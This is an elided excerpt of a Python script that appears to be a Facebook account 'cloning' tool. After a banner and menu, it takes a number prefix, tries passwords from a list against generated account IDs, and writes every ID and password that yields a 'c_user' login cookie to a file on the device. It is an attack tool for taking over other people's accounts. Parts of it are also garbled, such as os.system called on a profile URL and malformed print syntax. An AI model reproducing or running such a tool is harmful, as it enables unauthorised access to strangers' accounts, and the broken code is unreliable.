...
oks = []
twf = []
os.system('https://www.facebook.com/profile.php?id=100089093683098&mibextid=ZbWKwL')
os.system('https://www.facebook.com/profile.php?id=100089093683098&mibextid=ZbWKwL')
...

•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••  
•\033[33m𝗧𝗢𝗨𝗥 𝗡𝗔𝗠𝗘•𝗠𝗙𝗧𝗔𝗛                     •
•\x1b[38;5;208mTNUR NUMBER•𝟬𝟵𝟭𝟱𝟯𝟳𝟴𝟳𝟬𝟱📞\033[91mLibya 
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  I H •M F T A H  \033[0;m] ')
    print(f"")
    print(f"{BLUE}\033[32m[01] {GREEN}RANDOM CLONE PAK  M1")
    print(f"{BLUE}\033[32m[00] {GREEN}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    LUQMAN = input("[√] CHOOSE : ")
    if LUQMAN in ["1","01"]:
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  M F T A H   \033[0;m]")
    print(f"")
    linex()
    ...
    print\033[32m(f"21892 ,21891 ,21891 ,21894 ,21893")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MFTAH-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
